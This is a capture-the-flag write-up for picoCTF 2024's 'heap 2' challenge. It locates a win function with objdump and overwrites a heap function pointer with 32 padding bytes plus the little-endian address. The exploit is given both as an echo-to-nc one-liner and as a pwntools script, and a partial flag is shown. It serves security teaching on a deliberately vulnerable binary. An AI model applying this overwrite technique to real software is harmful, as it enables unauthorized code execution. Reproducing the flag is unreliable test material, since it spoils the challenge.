# Description

Can you handle function pointers? <br>
Download the binary here. <br>
Download the source here. <br>
Connect with the challenge instance here: <br>
nc mimas.picoctf.net 49262

# Solution

Here is a better formatted version of this writeup on [picoCTF Solutions website](https://picoctfsolutions.com/picoctf-2024-heap-2).

Start with getting the binary and source file with this command: `wget https://artifacts.picoctf.net/c_mimas/51/chall https://artifacts.picoctf.net/c_mimas/51/chall.c`

From the source file, it can be seen that getting to the win function is the goal. By running `objdump -D chall | less` and searching with `/win` the win function could be seen to have this address: `00000000004011a0`

From the previous section, it is known that 32 A's are needed to get to the edge. So this could be the start of the payload. Also now that the address has been retrieved it needs to be converted to little endian which swaps the order:

Orginial: `00 00 00 00 00 40 11 a0`

Swapped Endianness: `a0 11 40 00 00 00 00 00`

Then to convert it to hex format: `\xa0\x11\x40\x00\x00\x00\x00\x00`

If it is tried at this point to put it in manually it will not work because it needs to be sent as encoded text. One way of doing this is with the [echo command](https://linux.die.net/man/1/echo):

`echo -e -n "2\nAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\xa0\x11\x40\x00\x00\x00\x00\x00\n3\n4\n" | nc mimas.picoctf.net 49262`

The `2` is to write to the heap and then a new line character `\n` to act as an enter. Then there is the payload of the 32 A's and the hex address in little-endian. Lastly, print out the x value to make sure it is correct (returns @ to the win function) then use `4` to print the flag.

This could also be done with a simple pwntools script:

```
from pwn import *

p = remote("mimas.picoctf.net", 49262)

p.sendline(b"2")
p.recvuntil(b"buffer:")
p.sendline(b"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\xa0\x11\x40\x00\x00\x00\x00\x00")

p.recvuntil(b"choice:")
p.sendline(b"4")
print(p.recvall())
```

Flag: `picoCTF{and_down_the_road_we_go_dbb...}`
